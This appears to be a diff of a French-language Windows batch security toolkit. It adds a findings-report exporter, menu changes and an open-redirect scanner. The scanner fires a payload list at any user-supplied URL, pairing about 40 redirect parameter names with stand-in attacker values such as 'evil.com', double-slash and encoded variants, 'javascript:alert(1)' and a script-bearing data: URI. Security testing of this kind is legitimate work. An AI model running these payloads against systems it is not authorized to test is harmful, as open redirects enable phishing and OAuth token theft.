+echo Write-Host ""
+echo $manualFindings = @()
+echo while ($true) {
+echo    $target = Read-Host "  Cible (ex: https://site.com) ou ENTREE pour terminer"
+echo    if ([string]::IsNullOrWhiteSpace($target)) { break }
+echo    $sev    = Read-Host "  Severite (CRITIQUE/ELEVE/MOYEN/INFO)"
+echo    $cat    = Read-Host "  Categorie (ex: SQLi, XSS, LFI, TLS...)"
+echo    $msg    = Read-Host "  Description"
+echo    $cvss   = Read-Host "  Score CVSS estimé (0.0-10.0, ou ENTREE pour auto)"
+echo    if ([string]::IsNullOrWhiteSpace($cvss)) {
+echo        $cvss = switch($sev) { 'CRITIQUE' {'9.0'}; 'ELEVE' {'7.0'}; 'MOYEN' {'5.0'}; default {'2.0'} }
+echo    }
+echo    $manualFindings += [PSCustomObject]@{ Cible=$target; Severite=$sev; Categorie=$cat; Description=$msg; CVSS=$cvss; Source='Manuel' }
+echo    Write-Host "  [+] Finding ajoute." -f Green
+echo }
+echo.
+echo $report = [PSCustomObject]@{
+echo    Meta = [PSCustomObject]@{
+echo        Outil      = 'AleexScripts Cyber v2.0'
+echo        Date       = $date
+echo        Ordinateur = $env:COMPUTERNAME
+echo        Operateur  = $env:USERNAME
+echo        FichiersSource = $scanFiles
+echo    }
+echo    Statistiques = [PSCustomObject]@{
+echo        TotalFindings  = ($findings.Count + $manualFindings.Count)
+echo        Critiques      = ($findings.Findings + $manualFindings | Where-Object { $_.Severite -eq 'CRITIQUE' }).Count
+echo        Eleves         = ($findings.Findings + $manualFindings | Where-Object { $_.Severite -eq 'ELEVE' }).Count
+echo        Moyens         = ($findings.Findings + $manualFindings | Where-Object { $_.Severite -eq 'MOYEN' }).Count
+echo    }
+echo    FindingsImportes = $findings
+echo    FindingsManuels  = $manualFindings
+echo }
+echo.
+echo $outFile = "$desktop\Rapport_Findings_$dateFile.json"
+echo $report | ConvertTo-Json -Depth 10 | Out-File $outFile -Encoding UTF8
+echo.
+echo Write-Host ""
+echo Write-Host "  ================================================" -f Cyan
+echo Write-Host "  [OK] Rapport JSON exporte : $outFile" -f Green
+echo Write-Host "  Total findings : $($report.Statistiques.TotalFindings)" -f White
+echo Write-Host "  Critiques      : $($report.Statistiques.Critiques)" -f Red
+echo Write-Host "  Eleves         : $($report.Statistiques.Eleves)" -f Yellow
+echo Write-Host "  Moyens         : $($report.Statistiques.Moyens)" -f Cyan
+echo Write-Host "  ================================================" -f Cyan
+) > "%EJ_PS%"
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%EJ_PS%"
+if exist "%EJ_PS%" del /f /q "%EJ_PS%"
+echo.
+pause
+goto net_cyber_menu
+
+
+REM ===================================================================
+REM         OPEN REDIRECT - Detection avancee
+REM ===================================================================
+:cyber_open_redirect
+cls
+echo.
+echo  ===========================================================
+echo   OPEN REDIRECT - Detection avancee
+echo  ===========================================================
+echo   Impact : ELEVE - Phishing, vol de tokens OAuth, bypass CSP
+echo   Teste 40+ parametres classiques avec payloads varies :
+echo   Protocoles, double-slash, redirection chainee...
+echo  ===========================================================
+echo.
+set /p "OR_URL=URL cible (ex: https://site.com/redirect) : "
+if "%OR_URL%"=="" goto cat_web
+
+set "OR_PS=%TEMP%\openredirect_%RANDOM%.ps1"
+
+(
+echo $url = "!OR_URL!"
+echo $ua = "Mozilla/5.0"
+echo $vulns = 0
+echo.
+echo $params = @('url','redirect','redirect_url','redirect_uri','return','return_url',
+echo    'returnUrl','return_to','next','dest','destination','go','goto','link','out',
+echo    'target','redir','r','u','to','forward','forward_url','continue','cont','ref',
+echo    'referrer','callback','checkout_url','success_url','cancel_url','view','page',
+echo    'navigation','location','path','uri','site','domain','host','login','logout')
+echo.
+echo $payloads = @(
+echo    'https://evil.com',
+echo    '//evil.com',
+echo    '///evil.com',
+echo    '////evil.com',
+echo    'https:evil.com',
+echo    '\evil.com',
+echo    '\\evil.com',
+echo    'javascript:alert(1)',
+echo    'data:text/html,<script>alert(1)</script>',
+echo    '%2f%2fevil.com',
+echo    '%5c%5cevil.com',
+echo    'https://evil.com%23@legitimate.com',
+echo    'https://legitimate.com.evil.com'
+echo )
+echo.
+echo Write-Host ""
+echo Write-Host "  Test de $($params.Count) parametres x $($payloads.Count) payloads..." -f Cyan
+echo Write-Host ""
+echo.
+echo foreach ($param in $params) {
+echo    foreach ($payload in $payloads) {
+echo        $sep = if ($url -match '\?') { '&' } else { '?' }
+echo        $testUrl = $url + $sep + $param + '=' + [uri]::EscapeDataString($payload)
+echo        try {
+echo            $r = Invoke-WebRequest $testUrl -UserAgent $ua -MaximumRedirection 0 -TimeoutSec 5 -EA Stop -UseBasicParsing
+echo            if ($r.StatusCode -in 301,302,303,307,308) {
+echo                $loc = $r.Headers['Location']
+echo                if ($loc -match 'evil\.com|javascript:|data:') {
+echo                    Write-Host "  [!!!] Open Redirect CONFIRME !" -f Red
+echo                    Write-Host "        Parametre : $param" -f Magenta
+echo                    Write-Host "        Payload   : $payload" -f Magenta
+echo                    Write-Host "        Location  : $loc" -f Yellow
+echo                    $vulns++; break
+echo                }
+echo            }
+echo        } catch {
+echo            $loc = $_.Exception.Response.Headers['Location']
+echo            if ($loc -match 'evil\.com|javascript:|data:') {
+echo                Write-Host "  [!!!] Open Redirect CONFIRME (exception) !" -f Red
+echo                Write-Host "        Parametre : $param | Location : $loc" -f Yellow
+echo                $vulns++; break
+echo            }
+echo        }
+echo    }
+echo }
+echo.
+echo Write-Host ""
+echo if ($vulns -gt 0) { Write-Host "  [!!!] $vulns Open Redirect(s) detecte(s) !" -f Red }
+echo else              { Write-Host "  [OK] Aucun Open Redirect detecte." -f Green }
+) > "%OR_PS%"
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%OR_PS%"
+if exist "%OR_PS%" del /f /q "%OR_PS%"
+echo.
+pause
+goto cat_web
+
+:sys_diag_network
 cls
 set "DIAG_LOG=%USERPROFILE%\Desktop\Diagnostic_Reseau.log"
 set /a "ECHEC_COUNT=0"
@@ -3177,6 +4043,8 @@ if "%diag_choice%"=="0" goto system_tools
 if %diag_choice% GEQ 200 (
     set /a "toggle_idx=%diag_choice%-200"
     if "!toggle_idx!"=="1" call :ToggleFav "sys_report"
+    if "!toggle_idx!"=="2" call :ToggleFav "sys_temp_report"
+    if "!toggle_idx!"=="3" call :ToggleFav "sys_ram_check"
     if "!toggle_idx!"=="4" call :ToggleFav "sys_diag_network"
     if "!toggle_idx!"=="5" call :ToggleFav "sys_battery_report"
     if "!toggle_idx!"=="6" call :ToggleFav "sys_bitlocker_check"
@@ -4400,13 +5268,14 @@ pause >nul
 exit
 
 :DynamicMenu
-:: Arguments: %1="Titre", %2="Option1;Option2;Option3"
+:: Arguments: %1="Titre", %2="Option1;Option2;Option3", %3="OptionFlags" (ex: NONUMS)
 :: Retourne: ERRORLEVEL (1, 2, 3...) ou 0 pour Echap/Retour
 setlocal
 set "m_title=%~1"
 set "m_opts=%~2"
+set "m_flags=%~3"
 
-set "ps_code=$o=($env:m_opts -split ';');$t=$env:m_title;$sel=@();for($i=0;$i -lt $o.Count;$i++){if($o[$i] -notmatch '^\[---'){$sel+=$i}};$sIdx=0;$pad=115;try{if([console]::WindowWidth -gt 5){$pad=[math]::Min([console]::WindowWidth-5, 115)}}catch{};$maxV=50;try{if([console]::WindowHeight -gt 0){$maxV=[math]::Max([console]::WindowHeight-10, 10)}}catch{};$topI=0;clear-host;try{$cY=[console]::WindowTop}catch{$cY=0};function D{ try{[console]::SetCursorPosition(0,$cY)}catch{};write-host '  ========================================================================================' -f Cyan;write-host ('   ' + $t) -f White;write-host '  ========================================================================================' -f Cyan;write-host (' '.PadRight($pad));$num=1;$printed=0;for($i=0;$i -lt $o.Count;$i++){$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};$isH=($s -match '^\[---');if(-not $isH){$cNum=$num;$num++};if($i -lt $topI -or $printed -ge $maxV){continue};if($isH){write-host (' '.PadRight($pad));$printed++;if($printed -lt $maxV){write-host ('       ' + $s).PadRight($pad) -f Cyan;$printed++}}else{$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};if($i -eq $sel[$sIdx]){$str='{0}>> [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str -NoNewline -f Black -b White; $rem=$pad-$str.Length; if($rem -lt 0){$rem=0}; $ds=if($d){'   - '+$d}else{''}; if($ds.Length -gt $rem){$ds=$ds.Substring(0,$rem)}; write-host $ds.PadRight($rem) -f Yellow}else{$str='{0}   [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str.PadRight($pad) -f Gray};$printed++}};while($printed -lt $maxV){write-host (' '.PadRight($pad));$printed++};write-host (' '.PadRight($pad));write-host '  ----------------------------------------------------------------------------------------' -f Cyan;write-host '   [FLECHES] Naviguer | [ENTREE] Valider | [F] Favoriser | [S] Rechercher | [0/ECHAP] Retour    ' -NoNewline -f DarkGray};while($true){$target=$sel[$sIdx];if($target -lt $topI){$topI=$target};$lines=0;for($i=$topI;$i -le $target;$i++){if($o[$i] -match '^\[---'){$lines+=2}else{$lines+=1}};while($lines -gt $maxV){if($o[$topI] -match '^\[---'){$lines-=2}else{$lines-=1};$topI++};D;$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v -eq 38){$sIdx--;if($sIdx -lt 0){$sIdx=$sel.Count-1}}elseif($v -eq 40){$sIdx++;if($sIdx -ge $sel.Count){$sIdx=0}}elseif($v -eq 13){clear-host;exit ($sIdx+1)}elseif($v -eq 27 -or $k.Character -eq '0'){clear-host;exit 0}elseif($v -eq 70){clear-host;exit (200+$sIdx+1)}elseif($k.Character -eq 'S' -or $k.Character -eq 's'){clear-host;exit 299}elseif([string]$k.Character -match '^[1-9]$' -and [int][string]$k.Character -le $sel.Count){clear-host;exit ([int][string]$k.Character)}}"
+set "ps_code=$o=($env:m_opts -split ';');$t=$env:m_title;$fl=$env:m_flags;$sel=@();for($i=0;$i -lt $o.Count;$i++){if($o[$i] -notmatch '^\[---'){$sel+=$i}};$sIdx=0;$pad=115;try{if([console]::WindowWidth -gt 5){$pad=[math]::Min([console]::WindowWidth-5, 115)}}catch{};$maxV=50;try{if([console]::WindowHeight -gt 0){$maxV=[math]::Max([console]::WindowHeight-10, 10)}}catch{};$topI=0;clear-host;try{$cY=[console]::WindowTop}catch{$cY=0};function D{ try{[console]::SetCursorPosition(0,$cY)}catch{};write-host '  ========================================================================================' -f Cyan;write-host ('   ' + $t) -f White;write-host '  ========================================================================================' -f Cyan;write-host (' '.PadRight($pad));$num=1;$printed=0;for($i=0;$i -lt $o.Count;$i++){$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};$isH=($s -match '^\[---');if(-not $isH){$cNum=$num;$num++};if($i -lt $topI -or $printed -ge $maxV){continue};if($isH){write-host (' '.PadRight($pad));$printed++;if($printed -lt $maxV){write-host ('       ' + $s).PadRight($pad) -f Cyan;$printed++}}else{$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};if($i -eq $sel[$sIdx]){$str='{0}>> [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str -NoNewline -f Black -b White; $rem=$pad-$str.Length; if($rem -lt 0){$rem=0}; $ds=if($d){'   - '+$d}else{''}; if($ds.Length -gt $rem){$ds=$ds.Substring(0,$rem)}; write-host $ds.PadRight($rem) -f Yellow}else{$str='{0}   [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str.PadRight($pad) -f Gray};$printed++}};while($printed -lt $maxV){write-host (' '.PadRight($pad));$printed++};write-host (' '.PadRight($pad));write-host '  ----------------------------------------------------------------------------------------' -f Cyan;$show_help='   [FLECHES] Naviguer | [ENTREE] Valider | [F] Favoriser | [S] Rechercher | [0/ECHAP] Retour';if($fl -eq 'NONUMS'){$show_help='   [FLECHES] Naviguer | [ENTREE] Valider | [ECHAP] Retour'};write-host $show_help -NoNewline -f DarkGray};while($true){$target=$sel[$sIdx];if($target -lt $topI){$topI=$target};$lines=0;for($i=$topI;$i -le $target;$i++){if($o[$i] -match '^\[---'){$lines+=2}else{$lines+=1}};while($lines -gt $maxV){if($o[$topI] -match '^\[---'){$lines-=2}else{$lines-=1};$topI++};D;$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v -eq 38){$sIdx--;if($sIdx -lt 0){$sIdx=$sel.Count-1}}elseif($v -eq 40){$sIdx++;if($sIdx -ge $sel.Count){$sIdx=0}}elseif($v -eq 13){clear-host;exit ($sIdx+1)}elseif($v -eq 27 -or ($fl -ne 'NONUMS' -and $k.Character -eq '0')){clear-host;exit 0}elseif($fl -ne 'NONUMS' -and $v -eq 70){clear-host;exit (200+$sIdx+1)}elseif($fl -ne 'NONUMS' -and ($k.Character -eq 'S' -or $k.Character -eq 's')){clear-host;exit 299}elseif($fl -ne 'NONUMS' -and [string]$k.Character -match '^[1-9]$' -and [int][string]$k.Character -le $sel.Count){clear-host;exit ([int][string]$k.Character)}}"
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_code%"
 set "res=%errorlevel%"
@@ -4881,7 +5750,7 @@ echo  [OK] Rapport HTML genere sur le Bureau !
 powershell -Command "Start-Process '%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%.html'"
 echo.
 pause
-exit
+goto system_tools
 
 
 REM ===================================================================
